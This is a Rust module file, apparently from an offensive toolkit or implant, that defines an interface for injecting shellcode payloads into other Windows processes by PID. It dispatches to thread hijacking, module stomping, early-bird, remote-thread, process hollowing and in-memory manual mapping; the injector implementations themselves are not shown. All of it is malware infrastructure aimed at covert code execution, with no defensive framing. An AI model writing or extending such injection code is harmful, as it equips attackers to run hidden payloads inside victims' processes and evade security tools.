#[cfg(windows)]
pub mod thread_hijack;
#[cfg(windows)]
pub mod module_stomp;
#[cfg(windows)]
pub mod early_bird;
#[cfg(windows)]
pub mod remote_thread;

#[cfg(windows)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum InjectionMethod {
    Hollowing,
    ManualMap,
    RemoteThread,
    ThreadHijack,
    ModuleStomp,
    DllSideLoad,
    EarlyBird,
}

#[cfg(windows)]
pub trait Injector {
    fn inject(&self, pid: u32, payload: &[u8]) -> anyhow::Result<()>;
}

/// Dispatch helper — select an injector and run it.
#[cfg(windows)]
pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    match method {
        InjectionMethod::ThreadHijack  => thread_hijack::ThreadHijackInjector.inject(pid, payload),
        InjectionMethod::ModuleStomp   => module_stomp::ModuleStompInjector.inject(pid, payload),
        InjectionMethod::RemoteThread  => remote_thread::RemoteThreadInjector.inject(pid, payload),
        InjectionMethod::EarlyBird     => early_bird::EarlyBirdInjector.inject(pid, payload),
        InjectionMethod::Hollowing     => {
            hollowing::windows_impl::inject_into_process(pid, payload)
                .map_err(|e| anyhow::anyhow!("{}", e))
        }
        InjectionMethod::ManualMap     => {
            unsafe { module_loader::manual_map::load_dll_in_memory(payload) }
                .map(|_| ())
                .map_err(|e| anyhow::anyhow!("{}", e))
        }
        InjectionMethod::DllSideLoad   => {
            // DLL side-loading requires a disk-based DLL; not supported as
            // in-process shellcode injection.  Use ManualMap for in-memory.
            Err(anyhow::anyhow!("DllSideLoad requires a file path; use ManualMap for in-memory shellcode"))
        }
    }
}
